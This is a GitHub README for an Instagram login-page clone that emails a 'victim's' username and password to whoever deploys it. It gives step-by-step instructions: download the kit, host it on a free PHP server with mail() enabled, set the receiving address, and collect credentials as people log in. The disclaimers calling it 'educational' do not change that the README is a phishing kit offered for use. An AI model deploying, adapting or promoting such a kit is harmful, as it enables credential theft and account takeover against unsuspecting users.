# Insta-login
Instagram login page clone which sends your victim's credentials through email.</br>
The webpage works on both **mobile** web browsers & **desktop**.<br/>


❗ **Do not forget to not use it for malicious purposes, it's only for educational purposes.
You are solely responsible for your actions, that's obviously not me.**<br/>
</br>
</br>

## 🚀 Getting started

* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)

* Extract the zip and upload the website on your hosting server

  - Here I am using a free hosting service, that supports - PHP Version Selection and
 PHP mail() Features


![image](https://github.com/Abhijeetbyte/Insta-login/assets/80936610/cebdace5-114a-4a3c-bc5b-31030b8a3547)


* Change receiving email address</br>

  - ![img](images/email-php_LI.jpg)
</br>

### Webpage 
![Webpage](images/webpage-preview.png)

</br>

* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>

  - ![img](images/received-email.png)
 

<br/>


**Important Note:**

This example demonstrates a highly unethical practice of phishing, which is illegal and punishable by law. Unauthorized collection of personal data can lead to severe legal consequences, including imprisonment and substantial fines. This information is provided solely for educational purposes to understand and recognize phishing tactics. Always use your technical skills responsibly and legally.







